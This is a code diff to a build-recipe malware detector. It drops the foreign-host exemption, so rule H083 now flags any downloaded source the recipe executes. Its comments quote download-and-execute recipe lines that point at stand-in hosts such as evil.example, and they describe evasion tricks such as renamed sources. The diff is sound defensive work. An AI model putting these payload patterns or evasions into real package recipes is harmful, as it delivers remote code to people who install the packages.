@@ -817,148 +817,6 @@ def _declared_source_basenames(
     )
 
 
-def _foreign_declared_source_bases(
-    diff_text: str, current_text: str | None = None
-) -> frozenset[str]:
-    """Basenames of declared sources fetched from a host foreign to the
-    package's own upstream.
-
-    Bypass c8c3e1b7: ``source+=("http://evil.example/configure")`` followed
-    by ``./configure`` scored only SOURCE_BUCKET (20), because H083's
-    ``_H072_BENIGN_EXEC`` exemption treated the execution of a file fetched
-    from an attacker host like an ordinary build step.  A benign build
-    script genuinely comes *from the upstream*; one whose declared host
-    matches neither the ``url=`` upstream nor a trusted bucket is a remote
-    payload wearing a build-system name.
-
-    Sharing a host with a sibling declared source does *not* excuse it.  An
-    earlier spelling treated any host that served a second declared source
-    as a legitimate channel, and the wave-4/6 evasion matrix defeated it by
-    declaring two build scripts on the same attacker host - the "sibling"
-    was as foreign as the file it vouched for.  A real distribution channel
-    is the upstream host or a trusted bucket, both checked directly.
-
-    A name qualifies only when there is a reference to diverge from (a
-    ``url=`` host or another declared source), so a lone-source recipe is
-    not flagged by this arm, and hosts in a trusted bucket (official
-    mirrors, forges) are never "foreign".
-    """
-    from ..buckets import classify_url
-    from ..recipedoc import parse_recipe
-    from .structural import (
-        _TRUSTED_SOURCE_BUCKETS,
-        _declared_upstream_url,
-        _forge_owner_repo,
-        _registered_domain,
-    )
-
-    if current_text is not None:
-        post = parse_recipe(current_text)
-        upstream_text = current_text
-    else:
-        doc = parse_diff_lines(split_lines(diff_text))
-        post = parse_recipe("\n".join(doc.post_lines()))
-        upstream_text = "\n".join(doc.post_lines())
-    name_url = _source_urls_by_local_name(post)
-    if not name_url:
-        return frozenset()
-    domains = {
-        name: _registered_domain(_URL_HOST_RE.match(url).group(1))
-        for name, (url, _span) in name_url.items()
-        if _URL_HOST_RE.match(url)
-    }
-    upstream_host = _declared_upstream_url(upstream_text)
-    upstream_m = _URL_HOST_RE.match(upstream_host) if upstream_host else None
-    upstream_dom = _registered_domain(upstream_m.group(1)) if upstream_m else ""
-    #: ``(forge, owner, repo)`` of the upstream, so a source on the *same
-    #: registered domain but a different repository* (``github.com/evil``
-    #: against ``github.com/example/proj``) is not mistaken for the
-    #: upstream.  Registered-domain equality alone was the hole.
-    upstream_repo = _forge_owner_repo(upstream_host) if upstream_host else None
-    #: The hosts and repositories of the declared *archives* - the actual
-    #: artifacts a project distributes.  A benign build script belongs next
-    #: to them; declaring ``configure`` on one host while the tarball sits on
-    #: another is the wave-4 same-host evasion, where the attacker also sets
-    #: ``url=`` to the script's host so a bare ``url=`` comparison is fooled.
-    #: Only archive-shaped names count, so an attacker cannot vouch for a
-    #: script by adding a junk sibling (``.../a``) on the same host.
-    archive_repos = {
-        repo
-        for name, (url, _span) in name_url.items()
-        if _is_archive_url(url) and (repo := _forge_owner_repo(url))
-    }
-    archive_doms = {
-        domains[name]
-        for name, (url, _span) in name_url.items()
-        if name in domains and _is_archive_url(url)
-    } | {repo[0] for repo in archive_repos}
-
-    def _is_upstream_owned(url: str, dom: str) -> bool:
-        """The source lives under the package's own upstream repository."""
-        if not upstream_dom or dom != upstream_dom:
-            return False
-        if upstream_repo is None:
-            return True  # same registered domain, no repo shape to compare
-        src = _forge_owner_repo(url)
-        if src is None:
-            return True  # same domain, non-forge path: the upstream's own
-        return src[1] == upstream_repo[1]  # forge and owner must agree
-
-    def _shares_archive_channel(url: str, dom: str) -> bool:
-        """The source sits alongside the project's declared archive(s)."""
-        if not archive_doms:
-            return True  # no archive to compare against
-        if dom not in archive_doms:
-            return False
-        src = _forge_owner_repo(url)
-        if src is None or not archive_repos:
-            return True
-        return any(repo[1:] == src[1:] for repo in archive_repos)
-
-    foreign: set[str] = set()
-    for name, (url, _span) in name_url.items():
-        dom = domains.get(name, "")
-        if not dom:
-            continue
-        if classify_url(url)[0] in _TRUSTED_SOURCE_BUCKETS:
-            # A forge/official/raw host: the upstream's own file only when
-            # the repo matches, or when there is no `url=` to diverge from.
-            # `github.com/evil/configure` is not `github.com/example/proj`.
-            if not upstream_dom or _is_upstream_owned(url, dom):
-                continue
-            foreign.add(name)
-            continue
-        # An arbitrary host: `url=` is attacker-declared, so matching it is
-        # not enough.  A build script counts as the upstream's own only when
-        # a declared archive establishes the channel; otherwise
-        # `url="https://evil.example" source=("https://evil.example/configure")`
-        # made the payload look upstream-owned.
-        if (_is_upstream_owned(url, dom) and archive_doms
-                and _shares_archive_channel(url, dom)):
-            continue
-        foreign.add(name)
-    return frozenset(foreign)
-
-
-_ARCHIVE_BASENAME_RE = re.compile(
-    r"\.(?:tar(?:\.(?:gz|bz2|xz|zst|lz|Z))?|tgz|tbz2?|txz|tzst|zip|7z|rar|"
-    r"gz|xz|bz2|zst|deb|rpm|jar|whl|AppImage|run)$",
-    re.IGNORECASE,
-)
-
-
-def _is_archive_url(url: str) -> bool:
-    """A declared source that is a distributable artifact, not a script.
-
-    The suffix test plus the VCS schemes; ``foo.patch`` and ``configure`` are
-    deliberately excluded so a sibling script cannot define the channel.
-    """
-    return bool(_ARCHIVE_BASENAME_RE.search(_source_basename(url))) or bool(
-        re.match(r"(?:git|hg|svn|bzr|fossil)\+", url)
-    )
-
-
-@lru_cache(maxsize=8)
 def _declared_source_basenames_cached(text: str, whole_file: bool) -> frozenset[str]:
     from ..differ import _SOURCE_ARRAY_START_RE
 
@@ -2045,18 +1903,13 @@ _NUL_SUFFIX_RE = re.compile(r"(?:\\x00|\\0|\\u0000)+$")
 def edge_source_file_execution(ctx, add) -> None:
     """H083 predicate over the shared graph context.
 
-    A file downloaded via ``source=()`` is executed as a script.  Build-system
-    names (configure/make/...) are exempt unless the declared source came from
-    a host foreign to the upstream.  The facts come from *ctx*.
+    A file downloaded via ``source=()`` is executed as a script.  Any
+    declared source executed this way fires, whatever it is named: ``url=``
+    is attacker-declared, so a matching host cannot make a downloaded
+    ``configure`` ordinary, and the declaration is the only provenance that
+    exists.  The facts come from *ctx*.
     """
     source_basenames = ctx.source_basenames
-    foreign_bases = ctx.foreign_declared_bases
-    #: Declared local names that a `name::url` rename invented: the local
-    #: name is not the URL's own basename, so the payload wears the name.
-    _url_bases = {_source_basename(u) for u in ctx.declared_urls}
-    disguised_bases = {
-        s for s in source_basenames if s not in _url_bases
-    }
     # `source=("https://evil/${url:-stage.sh}")` downloads under the
     # expansion's fallback when the variable is unset - which is the fresh
     # environment an AUR helper builds in - so `bash "$srcdir/stage.sh"`
@@ -2119,15 +1972,6 @@ def edge_source_file_execution(ctx, add) -> None:
             # file.
             cbase = _NUL_SUFFIX_RE.sub("", base)
             declared = {_NUL_SUFFIX_RE.sub("", s) for s in source_basenames}
-            # A benign build name is exempt when it is the upstream's own
-            # file (its declared name is the URL's own basename) or comes
-            # from a host trusted relative to `url=`.  It stops being
-            # ordinary when a `name::url` rename ships a payload under a
-            # benign name (`configure::https://…/stage`) or the host is
-            # foreign: then the filename is a disguise, not provenance.
-            if (base in _H072_BENIGN_EXEC and base not in foreign_bases
-                    and base not in disguised_bases):
-                continue
             if patch_base and base == patch_base:
                 continue
             alias_of = aliases_by_fn.get(fn, {}).get(base)
